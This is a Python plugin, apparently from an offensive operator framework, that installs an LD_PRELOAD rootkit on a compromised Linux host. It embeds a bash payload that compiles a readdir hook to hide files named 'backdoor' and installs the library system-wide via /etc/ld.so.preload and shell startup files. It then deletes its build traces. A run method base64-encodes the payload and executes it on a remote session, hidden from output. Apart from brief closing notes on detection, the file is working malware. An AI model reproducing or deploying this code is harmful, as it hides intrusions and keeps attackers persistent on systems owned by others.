"""LD_PRELOAD rootkit script."""

from ..base import OperatorScript, ScriptResult


class LDPreloadRootkit(OperatorScript):
    """Install LD_PRELOAD-based rootkit for persistence."""
    
    name = "LD_PRELOAD Rootkit"
    description = "Install LD_PRELOAD-based rootkit"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] LD_PRELOAD ROOTKIT"
echo "====================="
echo ""

echo "[+] Creating malicious shared library..."
ROOTKIT_LIB="/lib/x86_64-linux-gnu/libprocesshider.so"

cat > /tmp/rootkit.c 2>/dev/null <<'EOFCODE'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static int (*orig_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, "backdoor") != NULL) {
            continue;
        }
        break;
    }
    return dir;
}
EOFCODE

echo "[+] Compiling rootkit library..."
if command -v gcc &>/dev/null; then
    gcc -Wall -fPIC -shared -o /tmp/libprocesshider.so /tmp/rootkit.c -ldl 2>/dev/null && \
        echo "[+] Compilation successful" || \
        echo "[-] Compilation failed"
    
    if [ -f /tmp/libprocesshider.so ]; then
        cp /tmp/libprocesshider.so "$ROOTKIT_LIB" 2>/dev/null && \
            echo "[+] Rootkit installed to: $ROOTKIT_LIB" || \
            echo "[-] Could not install rootkit (need root)"
    fi
else
    echo "[-] gcc not available"
fi

echo ""
echo "[+] Installing LD_PRELOAD in system configuration..."
echo "$ROOTKIT_LIB" >> /etc/ld.so.preload 2>/dev/null && \
    echo "[+] Added to /etc/ld.so.preload" || \
    echo "[-] Could not modify /etc/ld.so.preload"

echo ""
echo "[+] Alternative: User-level LD_PRELOAD..."
echo "export LD_PRELOAD=$ROOTKIT_LIB" >> ~/.bashrc 2>/dev/null && \
    echo "[+] Added to ~/.bashrc"
echo "export LD_PRELOAD=$ROOTKIT_LIB" >> ~/.profile 2>/dev/null && \
    echo "[+] Added to ~/.profile"

echo ""
echo "[+] Verifying installation:"
cat /etc/ld.so.preload 2>/dev/null | grep -i preload

echo ""
echo "[+] Rootkit features:"
echo "  - Hides processes/files containing 'backdoor' in name"
echo "  - Automatically loaded by all dynamically linked executables"
echo "  - Persistent across reboots"

echo ""
echo "[+] Cleanup:"
rm -f /tmp/rootkit.c /tmp/libprocesshider.so 2>/dev/null

echo ""
echo "[!] WARNING: This is detectable by:"
echo "  - ldd /bin/ls | grep LD_PRELOAD"
echo "  - cat /etc/ld.so.preload"
echo "  - rkhunter / chkrootkit scans"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Installing LD_PRELOAD rootkit...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="LD_PRELOAD rootkit installation executed",
                metadata={"script": "ld_preload_rootkit"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
